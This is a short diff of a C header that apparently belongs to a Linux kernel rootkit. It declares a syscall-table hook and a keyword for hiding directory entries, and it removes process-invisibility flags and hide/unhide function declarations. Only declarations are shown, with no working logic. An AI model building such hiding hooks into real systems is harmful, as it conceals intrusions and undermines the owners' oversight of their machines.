@@ -13,12 +13,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define TO_HIDE "lzrs_suffix"
-#define TSK_INVISIBLE 0x10000000
-#define SIGPROC 31
-
-void do_hide_dir_proc(void);
-void undo_hide_dir_proc(void);
+#define TO_HIDE "lzrs_keyword"
 
 int hook_syscall_table(void);
 
